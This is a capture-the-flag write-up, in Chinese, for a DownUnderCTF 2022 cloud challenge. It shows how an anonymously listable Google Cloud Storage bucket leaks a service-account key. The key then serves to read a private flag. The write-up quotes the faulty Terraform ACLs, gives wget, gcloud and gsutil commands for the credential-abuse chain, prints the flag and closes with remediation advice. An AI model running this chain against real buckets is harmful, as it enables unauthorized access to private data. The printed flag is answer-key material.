# DownUnderCTF 2022 Jimmy Builds a Kite Writeup

## 题目简述

题目页面托管在 Google Cloud Storage 静态网站桶 `jimmys-big-adventure`。前端伪终端只是按计时器播放固定对白，没有真正的游戏交互。真正的漏洞是桶允许匿名列举对象，并把 CI/CD 服务账号私钥 `credentials.json` 公开；该服务账号又拥有读取私有 `flag.txt` 的对象 ACL。

## 解题过程

先从托管域名识别 GCS 对象存储。去掉 `/index.html`，访问桶根端点：

```text
https://jimmys-big-adventure.storage.googleapis.com/
```

服务返回 XML 对象列表，其中可以看到 `flag.txt` 和 `credentials.json`。匿名直接读取 `flag.txt` 会得到 `storage.objects.get` 权限错误，但 `credentials.json` 被单独授予 `allUsers:READER`，可以下载。

Terraform 源码明确展示了错误的权限关系：

```hcl
resource "google_storage_bucket_object" "public_key_object" {
  name    = "credentials.json"
  bucket  = google_storage_bucket.static_site.name
  content = base64decode(
    google_service_account_key.private_service_account_key.private_key
  )
}

resource "google_storage_object_access_control" "public_key_object_acl" {
  object = "credentials.json"
  role   = "READER"
  entity = "allUsers"
}
```

同一配置只把私有对象读权限授给 `buildkite-agent` 服务账号：

```hcl
resource "google_storage_object_access_control" "private_objects_acl" {
  object = each.value
  role   = "READER"
  entity = "user-${google_service_account.cicd_service_account.email}"
}
```

因此下载题目中的临时服务账号密钥并激活它，再读取对象：

```bash
wget -O credentials.json \
  'https://jimmys-big-adventure.storage.googleapis.com/credentials.json'
gcloud auth activate-service-account --key-file=credentials.json
gsutil cat 'gs://jimmys-big-adventure/flag.txt'
```

输出为：

```text
DUCTF{Th0se_cr3ds_w3r3nt_m34nt_2_b33_th3r3}
```

## 方法总结

利用链是“匿名列桶 → 发现公开服务账号密钥 → 以该身份读取私有对象”。关键不在静态网页本身，而在对象 ACL 与云身份的授权图：公开的 key 文件把本应私有的 `buildkite-agent` 身份交给任何人，而该身份恰有 `flag.txt` 的读取权。服务账号私钥不能作为桶对象发布；应使用短期工作负载身份、最小权限，并关闭不必要的匿名 bucket listing。
